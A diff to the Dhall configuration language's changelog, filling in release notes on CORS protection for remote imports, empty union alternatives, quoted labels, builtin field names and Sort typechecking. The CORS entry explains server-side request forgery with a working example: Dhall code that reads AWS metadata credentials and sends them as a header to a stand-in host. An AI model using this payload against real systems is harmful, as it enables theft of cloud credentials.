@@ -11,7 +11,33 @@ Breaking changes:
 
 *   [Protect transitive remote imports with CORS check](https://github.com/dhall-lang/dhall-lang/pull/411)
 
-    TODO
+    This change protects against 
+    [server-side request forgery](https://www.owasp.org/index.php/Server_Side_Request_Forgery)
+    by preventing remote imports from importing transitive remote imports 
+    that do not explicitly opt in via CORS.
+
+    For example, a simple way to exploit an AWS EC2 instance before this change
+    is to ask the instance to interpret `https://example.com/malicious`, where:
+
+    * `https://example.com/malicious` imports `https://example.com/recordsHeaders using https://example.com/stealCredentials`
+    * `https://example.com/stealCredentials` contains
+
+      ```haskell
+      [ { header = "Credentials"
+        , value = http://169.254.169.254/latest/meta-data/iam/security-credentials/role as Text
+        }
+      ]
+      ```
+
+    This is a breaking change because now the import of `http://169.254.169.254`
+    would be rejected, as the response would not include an `Access-Control-Allow-Origin` 
+    header permitting itself to be transitively imported.
+
+    Similarly, this change protects against an external internet import from
+    triggering an interpreter request against a potentially sensitive intranet
+    endpoint unless that intranet endpoint had enabled CORS whitelisting that
+    external domain.
+
 
 *   [Remove support for fragment identifiers](https://github.com/dhall-lang/dhall-lang/pull/406)
 
@@ -31,21 +57,66 @@ Breaking changes:
 
 New features:
 
+*   [Add support for union alternatives without fields](https://github.com/dhall-lang/dhall-lang/pull/438)
+
+    This adds support for unions with empty alternatives that don't store any
+    values. In the simple case where the union has all empty alternatives it
+    degenerates to an enum.
+    
+    For example:
+    
+    ```hs
+    let Role = < Wizard | Fighter | Rogue >
+
+    let show : Role → Text
+        show =
+            λ(x : Role)
+          → merge { Wizard = "Wizard", Fighter = "Fighter", Rogue = "Rogue" } x
+
+    in  show Role.Wizard
+    ```
+
 *   [Expand character set for quoted labels](https://github.com/dhall-lang/dhall-lang/pull/408)
 
-    TODO
+    This expands quoted labels to permit all non-control ASCII characters except
+    backticks, so e.g. this label is now allowed:
+    
+    ```hs
+    `<>.\!@#$%^&*()*`
+    ```
 
 *   [Allow builtin names as fields](https://github.com/dhall-lang/dhall-lang/pull/437)
 
-    TODO
+    Up until now it was not possible to use builtin names anywhere except when
+    invoking builtins. This caused some common idioms to be uncomfortable to use,
+    e.g. in order to use builtin names in record fields one needed to quote them:
+    
+    ```hs
+    let Prelude = https://prelude.dhall-lang.org/package.dhall
 
-*   [Add support for union alternatives without fields](https://github.com/dhall-lang/dhall-lang/pull/438)
+    in  Prelude.`List`.map
+    ```
+    
+    This change allows using builtin names for anything but bound variables, so
+    this is now allowed:
+    
+    ```hs
+    let Prelude = https://prelude.dhall-lang.org/package.dhall
 
-    TODO
+    in  Prelude.List.map
+    ```
 
 *   [Fix typechecking of Sorts in records](https://github.com/dhall-lang/dhall-lang/pull/453)
 
-    TODO
+    This fixes a limitation of the record typechecking, for which `Sort`s were forbidden
+    in record types.
+    
+    So the following didn't use to typecheck but now do:
+    
+    * `{ a : Kind → Kind }` with type `Sort`
+    * `{ a : { b : Kind } }` with type `Sort`
+    * `{ a : { b : Kind → Kind } }` with type `Sort`
+    * `{ a = { b = Type } }` with type `{ a : { b : Kind } }`
 
 Other changes:
 
